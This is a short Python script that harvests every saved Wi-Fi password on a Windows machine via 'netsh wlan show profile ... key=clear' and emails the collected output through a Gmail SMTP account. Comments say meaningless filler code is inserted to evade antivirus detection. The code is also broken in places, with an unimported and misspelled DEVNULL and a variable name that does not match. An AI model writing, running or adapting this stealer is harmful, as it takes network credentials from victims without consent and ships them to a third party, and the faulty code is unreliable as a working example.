import subprocess, re, smtplib, os

def send_email(mail, password, message):
    host = smtplib.SMTP("smtp.gmail.com", 587)
    host.starttls()
    host.login(mail,password)
    host.sendmail(mail,mail,message)
    host.quit()

 #irrelevent code just to try bypass antiviress 
def amount(x,y, sum):
    sum = x + y
    sum = sum - 5
    return sum
# end


c1  = "netsh wlan show profile"
sub1 = subprocess.check_output(c1, shell=True, stderr=DEVNULL,stdin=DEVNULL)
regular_list = re.findall("(?:Benutzer\s:\s)(.*)",sub1)

#irrelevent code just to try bypass antiviress 
age = 24
if (age > 18):
    answer = "u are allowed to buy beer"
else: answer = "u are a kid, u cannot buy beer"
# end
result = ""

for regular in regular_list:
    c2 = "netsh wlan show profile " + regular + " key=clear"
    sub2 = subprocess.check_output(c2, shell=True, stderr=DeVNULL,stdin=DEVNULL)
    current_value = sub2
    resut = resut + current_value

send_email("login", "password", resut)
